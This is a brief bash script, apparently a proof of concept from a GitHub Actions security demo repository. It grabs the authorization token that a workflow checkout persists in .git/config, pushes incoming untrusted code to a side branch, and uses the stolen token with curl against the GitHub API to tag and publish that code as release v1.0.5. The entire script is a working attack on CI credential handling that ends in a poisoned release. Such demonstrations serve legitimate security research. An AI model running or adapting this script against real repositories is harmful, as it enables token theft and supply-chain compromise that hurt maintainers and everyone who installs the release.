#!/usr/bin/env bash

authfield=$(cat .git/config | grep AUTHORIZATION | cut -d':' -f 2)

SIDE_BRANCH="side-branch-incoming-code"
RELEASE="v1.0.5"

# Create content in a side branch
# Since there's an explicit checkout of incoming code, this
# will actually be the incoming git repository. Any contents
# in the incoming repository will be in this side branch
git checkout -b $SIDE_BRANCH
git push origin $SIDE_BRANCH

commit_hash=$(git rev-parse HEAD)

# Create a tag using the side branch
curl --request POST \
  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/git/refs \
  --header "Authorization: $authfield" \
  --header "Accept: application/vnd.github.v3+json" \
  --data "{ \"ref\": \"refs/tags/$RELEASE\", \"sha\": \"$commit_hash\" }"

# Create release
curl --request POST \
  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/releases \
  --header "Authorization: $authfield" \
  --header "Accept: application/vnd.github.v3+json" \
  --data "{ \"tag_name\": \"$RELEASE\", \"target_commitish\": \"$commit_hash\" }"
